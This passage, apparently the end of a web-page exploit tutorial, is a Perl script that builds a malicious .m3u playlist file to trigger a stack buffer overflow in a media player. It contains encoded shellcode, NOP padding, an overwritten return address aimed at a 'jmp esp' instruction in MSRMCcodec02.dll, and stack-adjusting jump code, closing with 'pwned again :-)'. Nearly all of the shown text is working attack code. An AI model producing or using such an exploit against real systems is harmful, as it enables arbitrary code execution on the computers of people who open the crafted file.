"\x38\x4c\x30\x4c\x4a\x45\x54\x51\x4f\x42\x48\x4d\x48\x4b" .<br/>
"\x4e\x4d\x5a\x44\x4e\x50\x57\x4b\x4f\x4b\x57\x42\x43\x43" .<br/>
"\x51\x42\x4c\x45\x33\x45\x50\x41\x41";<br/>
<br/>
my $restofbuffer = "\x90" x ($buffersize-(length($junk)+length($nop)+length($shellcode)));<br/>
<br/>
my $eip = pack('V',0x01ccf23a); &nbsp;#jmp esp from MSRMCcodec02.dll<br/>
<br/>
my $preshellcode = "X" x 4; <br/>
<br/>
my $jumpcode = "\x83\xc4\x5e" . &nbsp; #add esp,0x5e<br/>
&nbsp; &nbsp;"\x83\xc4\x5e" . &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; #add esp,0x5e<br/>
&nbsp; &nbsp;"\xff\xe4"; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;#jmp esp<br/>
<br/>
my $nop2 = "0x90" x 10; &nbsp; # only used to visually separate<br/>
<br/>
my $buffer = $junk.$nop.$shellcode.$restofbuffer;<br/>
<br/>
print "Size of buffer : ".length($buffer)."\n";<br/>
<br/>
open($FILE,"&gt;$file");<br/>
print $FILE $buffer.$eip.$preshellcode.$jumpcode;<br/>
close($FILE);<br/>
print "m3u File Created successfully\n";<br/>
<br/>
pwned again :-)<br/>
<br/>
<br/>
<br/>
</body></html>